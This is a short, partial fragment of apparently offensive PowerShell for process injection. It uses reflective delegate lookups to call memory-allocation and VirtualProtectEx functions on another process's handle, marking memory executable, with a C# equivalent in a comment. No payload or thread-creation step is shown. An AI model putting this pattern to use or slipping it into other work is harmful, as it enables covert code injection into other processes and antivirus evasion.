...
# (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x1000, 0x04)
...
# C#: IntPtr expAddr = VirtualProtectEx(hProcess, expAddr, len, 0x20, out oldProtect);
#$procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtectEx), 
#  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([Bool]))).Invoke($hProcess, $expAddr, [UInt32]$buf.Length, 0x20, 0)
